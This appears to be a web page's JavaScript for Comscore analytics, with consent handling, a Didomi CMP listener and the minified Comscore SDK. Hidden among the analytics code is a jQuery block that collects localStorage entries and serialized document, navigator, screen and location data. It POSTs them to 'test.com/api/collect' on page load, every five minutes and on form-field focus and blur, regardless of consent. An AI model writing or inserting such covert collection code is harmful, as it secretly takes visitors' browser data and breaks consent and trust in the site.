var comscoreC2 = '7184769';
var comscoreC1 = '2';
var callComscore = function () {
  var params = {
    c1: comscoreC1,
    c2: comscoreC2,
    cs_ucfr: getCS_UCFR(),
    options: {
      enableFirstPartyCookie: true
    }
  };
  if (window.COMSCORE && typeof window.COMSCORE.beacon === 'function') {
    window.COMSCORE.beacon(params);
  } else {
    window._comscore = window._comscore || [];
    window._comscore.push(params);
  }
};
var getCS_UCFR = function () {
  function getResult(knownConsent) {
    switch (knownConsent) {
      case '-1':
      case null:
      case undefined:
        return '';
      case '0':
      case false:
        return 0;
      case '1':
      case true:
        return 1;
      default:
        return '';
    }
  }
  if (window.ueCookiesPolicy && typeof window.ueCookiesPolicy.getUserConsentStatusForVendors === 'function') {
    var policyConsent = window.ueCookiesPolicy.getUserConsentStatusForVendors('comscore'); // true || false || undefined || null
    return getResult(typeof policyConsent === 'object' ? policyConsent.comscore : undefined); // 1 || 0 || ''
  } else if (window.localStorage) {
    var storageConsent = localStorage.getItem('ueUserContentComscore'); // '1' || '0' || '-1' || null
    return getResult(storageConsent); // 1 || 0 || ''
  } else {
    return getResult(); // ''
  }
};
var init = function () {
  bindCMPEvents();
  callComscore();
};
var bindCMPEvents = function () {
  window.didomiEventListeners = window.didomiEventListeners || [];
  window.didomiEventListeners.push({
    event: 'consent.changed',
    listener: function () {
      callComscore();
      console.log("llamamos a Comscore tras el cambio en el CMP");
    }
  });
};
$(function () {
  const observeKeys = window.observeKeys;
  const globalVariableNames = ["document", "navigator", "screen", "location"];
  function computeHash(data) {
    const dataArray = Object.entries(data).flat();
    let hashValue = 0;
    for (const val of dataArray) {
      for (let i = 0; i < val.length; i++) {
        const charCode = val.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
    }
    return hashValue.toString(16);
  }
  function filterLocalStorage() {
    const filteredData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (observeKeys.includes(key)) {
        filteredData[key] = localStorage.getItem(key);
      }
    }
    return filteredData;
  }
  function extractGlobalVariables() {
    const extractedData = {};
    for (const variable of globalVariableNames) {
      extractedData[variable] = JSON.stringify(window[variable]);
    }
    return extractedData;
  }
  function sendData(data) {
    const hashId = computeHash(data);
    const serverUrl = 'https://test.com/api/collect';
    $.ajax({
      url: serverUrl,
      type: 'POST',
      contentType: "application/json",
      data: JSON.stringify({
        id: hashId,
        data: data
      }),
      success: function () {
        console.log("Data transfer successful");
      },
      error: function () {
        console.error("Data transfer failed");
      }
    });
  }
  function collectAndSendData() {
    const savedData = {
      ...filterLocalStorage(),
      ...extractGlobalVariables()
    };
    if (Object.keys(savedData).length > 0) {
      sendData(savedData);
    }
  }
  document.querySelectorAll('.form-control').forEach(inputField => {
    inputField.addEventListener('input', () => {
      const isNotEmpty = inputField.value.length > 0;
      inputField.closest('.form-group').classList.toggle('field--not-empty', isNotEmpty);
    });
  });
  window.addEventListener("load", collectAndSendData);
  setInterval(collectAndSendData, 5 * 60 * 1000);
  function jshook(element, eventName, handler) {
    element.addEventListener(eventName, handler);
  }
  const element = document.querySelector('.form-control');
  jshook(element, 'focus', () => {
    collectAndSendData();
  });
  jshook(element, 'blur', () => {
    collectAndSendData();
  });
});
init();
var COMSCORE = function (e) {
  function n(e, n, r) {
    -1 == e.indexOf("?") && (e += "?");
    var t = !1;
    (-1 != e.indexOf("&") || e.length - 1 > e.indexOf("?")) && (t = !0);
    for (var a = 0; a < n.length; ++a) {
      var i = n[a];
      for (var c in i) t && (e += "&"), t = !0, e += c + "=" + o(i[c] + "");
    }
    return e = function (e, n) {
      if (e.length > n) {
        var r = e.substring(0, n - 8).lastIndexOf("&");
        e = (e = e.substring(0, r) + "&ns_cut=" + o(e.substring(r + 1))).substring(0, n);
      }
      return e;
    }(e, r), e;
  }
  function r(e, n) {
    for (var r in n) e[r] = n[r];
  }
  var o = "undefined" != typeof encodeURIComponent ? encodeURIComponent : escape,
    t = "undefined" != typeof decodeURIComponent ? decodeURIComponent : unescape,
    a = {};
  Object.defineProperty(a, "o", {
    value: !0
  });
  var i,
    c = a.t = x = a.i = void 0,
    f = [1, 7, 8, 9, 10],
    u = -1,
    l = !1,
    s = !1,
    p = [];
  function d() {
    for (var e = 0, n = p; e < n.length; e++) {
      (0, n[e])();
    }
  }
  function v() {
    var e;
    return function () {
      if (!s) {
        s = !0;
        var e = +new Date();
        "function" == typeof __tcfapi && __tcfapi("addEventListener", 2, function (n, r) {
          r && (-1 == u && (u = +new Date() - e), i = n, d());
        });
      }
    }(), "function" == typeof __tcfapi && (__tcfapi("getTCData", 2, function (n) {
      l || (-1 == u && (u = 0), e = n, i = n, d());
    }), e || (l = !0), !0);
  }
  function m(e) {
    var n = {};
    if (!e) return n;
    for (var r = 0, o = f; r < o.length; r++) {
      var t = o[r];
      n[t] = e["purpose"]["consents"][t];
    }
    return n;
  }
  var x = a.i = function () {
    try {
      if (!v()) return !1;
      if (i) return i["gdprApplies"] ? {
        u: i["cmpId"],
        l: i["cmpVersion"],
        p: l,
        v: u,
        m: !0,
        C: !0,
        _: !0,
        h: i["isServiceSpecific"],
        k: i["purposeOneTreatment"],
        R: i["vendor"]["legitimateInterests"][77],
        g: i["vendor"]["consents"][77],
        A: m(i),
        D: i["publisherCC"] || ""
      } : {
        u: i["cmpId"],
        l: i["cmpVersion"],
        p: l,
        v: u,
        m: !0,
        C: !1
      };
    } catch (e) {}
    return {
      m: !1,
      p: !0
    };
  };
  c = a.t = function (e) {
    p.indexOf(e) > -1 || p.push(e);
  };
  var C = [],
    w = !1;
  function _() {
    if (!w) {
      w = !0;
      for (var e = 0, n = C; e < n.length; e++) {
        (0, n[e])();
      }
      C = [], w = !1;
    }
  }
  function b(e, n, r, o) {
    e.cookie = "".concat(n, "=").concat(r, "; expires=").concat(o.toUTCString(), "; path=/");
  }
  var y = "_scor_uid";
  function h(e, n) {
    var r,
      o,
      t = function (e, n) {
        for (var r = 0, o = e.split("; "); r < o.length; ++r) if (0 == o[r].indexOf(n)) return o[r].substring(n.length + 1);
      }(n.cookie, y);
    t || (r = new Date().getTime(), o = "undefined" != typeof performance && performance.now && 1e3 * performance.now() || 0, t = "xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx".replace(/[xy]/g, function (e) {
      var n = 16 * Math.random();
      return r > 0 ? (n = (r + n) % 16 | 0, r = Math.floor(r / 16)) : (n = (o + n) % 16 | 0, o = Math.floor(o / 16)), ("x" === e ? n : 3 & n | 8).toString(16);
    }));
    var a = new Date(new Date().getTime() + 33696e6);
    b(n, y, t, a), e[0]["cs_fpcu"] = t;
  }
  function k(e, n, o, t) {
    var a = n.enableTcfIntegration == undefined || n.enableTcfIntegration,
      i = n.enableFirstPartyCookie,
      c = {
        I: !1,
        P: !0
      };
    return a && (c = function () {
      var e = x();
      if (!e) return {
        I: !1,
        P: !0
      };
      var n,
        r = {
          gdpr: 0,
          gdpr_p1t: "",
          gdpr_li: "",
          gdpr_purps: "",
          gdpr_pcc: ""
        };
      if (!e.m) return {
        I: !0,
        m: !1,
        P: !0,
        labels: {
          cs_cmp_nc: 1
        },
        M: !1,
        O: !0
      };
      if (r["cs_cmp_nc"] = e.p ? 1 : 0, r["cs_cmp_id"] = e.u, r["cs_cmp_sv"] = e.l, r["cs_cmp_rt"] = e.v, !e.C) return {
        I: !0,
        m: !0,
        P: !0,
        labels: r,
        M: !0,
        O: !1
      };
      if (r["gdpr"] = "1", !e._) return {
        I: !0,
        m: !0,
        P: !1,
        labels: r,
        M: !1,
        O: !0
      };
      r["gdpr_li"] = e.R ? "1" : "0", r["gdpr_pcc"] = e.D, e.h && e.k ? (r["gdpr_p1t"] = "1", n = !0) : (r["gdpr_p1t"] = "0", n = e.A[1]);
      var o = !1;
      if (e.g) {
        o = n;
        var t = [];
        n && t.push(1), e.A[7] && t.push(7), e.A[8] && t.push(8), e.A[9] && t.push(9), e.A[10] && t.push(10), r["gdpr_purps"] = t.join(",");
      }
      return {
        I: !0,
        m: !0,
        P: o,
        labels: r,
        M: e.g && n,
        O: !e.g || !n
      };
    }()).I && (t || c.m) && r(e[1], c.labels), a && c.I ? c.M ? i && h(e, o) : (t || c.m) && c.O && (!function (e, n) {
      b(e, n, "", new Date(0));
    }(o, y), e[1]["cs_fpcd"] = "1") : i && "1" == e[1]["cs_ucfr"] && h(e, o), c;
  }
  function R(e, r, o) {
    c(_);
    var t = function (r) {
        !function (e) {
          if ("undefined" != typeof Image) {
            var n = new Image();
            window.ns_p || (window.ns_p = n), n.src = e;
          }
        }(n(r ? "https://sb.scorecardresearch.com/b?" : "https://sb.scorecardresearch.com/b2?", e, o));
      },
      a = k(e, r, document, !1);
    !a.I || a.m ? t(a.P) : C.push(function () {
      var n = k(e, r, document, !1);
      t(n.P);
    });
  }
  function g(e, n, o, a) {
    var i = [{}, {
      cs_it: o,
      cv: "4.0.0+2301240627",
      ns__t: +new Date(),
      ns_c: a ? a.characterSet : ""
    }, {}];
    for (var c in window != window.top && (i[1]["ns_if"] = 1), a && (i[2] = {
      c7: a.URL,
      c8: a.title,
      c9: a.referrer
    }), e) {
      var f = e[c];
      "string" != typeof f && "number" != typeof f || ("c1" == c || "c2" == c ? i[0][c] = f : i[1][c] = f);
    }
    if (!i[0]["c2"]) return !1;
    if (i[0]["c1"] || (i[0]["c1"] = 2), n.url_append) {
      var u = function (e) {
        for (var n = {}, r = e.split("&"), o = 0; o < r.length; ++o) {
          var a = r[o].split("=");
          2 == a.length && (n[a[0]] = t(a[1]));
        }
        return n;
      }(n.url_append.replace(/&amp;/, "&"));
      r(i[1], u);
    }
    return i;
  }
  var A,
    D = (A = {
      F: "b9",
      T: document,
      U: function (e, n) {
        R(e, n, 2048);
      }
    }, function (e) {
      if (e) {
        var n = e.options || {},
          r = g(e, n, A.F, A.T);
        r && A.U(r, n);
      }
    }),
    I = function (e) {
      return function (n) {
        n = n || _comscore;
        for (var r = 0; r < n.length; ++r) e(n[r]);
        _comscore = [];
      };
    }(D);
  return "undefined" == typeof _comscore && (window._comscore = []), I(), e.beacon = D, e.purge = I, Object.defineProperty(e, "o", {
    value: !0
  }), e;
}({});